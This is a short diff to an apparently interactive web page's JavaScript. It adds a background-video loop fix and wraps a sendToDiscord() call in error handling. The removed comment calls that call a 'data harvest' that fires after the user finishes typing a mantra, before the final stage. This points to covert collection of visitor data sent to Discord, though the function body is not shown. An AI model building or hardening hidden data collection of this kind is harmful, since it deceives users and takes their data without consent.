@@ -34,6 +34,16 @@ document.getElementById('start-btn').addEventListener('click', () => {
         bgAudio.volume = 0.4;
         bgAudio.play().catch(e => console.log("Audio play failed:", e));
     }
+
+    // FORCE VIDEO LOOP (iOS/Safari fix)
+    const bgVideo = document.getElementById('bg-video');
+    if (bgVideo) {
+        bgVideo.play().catch(e => console.log("Video auto-play failed."));
+        bgVideo.addEventListener('ended', () => {
+            bgVideo.currentTime = 0;
+            bgVideo.play();
+        }, false);
+    }
 });
 
 function vibrate(ms) {
@@ -289,7 +299,7 @@ window.checkMantra = function () {
         if (mantraCount >= MAX_MANTRA) {
             input.disabled = true; // Disable input while waiting
             setTimeout(() => {
-                sendToDiscord(); // Trigger data harvest BEFORE the hold button
+                try { sendToDiscord(); } catch (e) { console.error(e); }
                 goToStage('final');
             }, 500);
         }
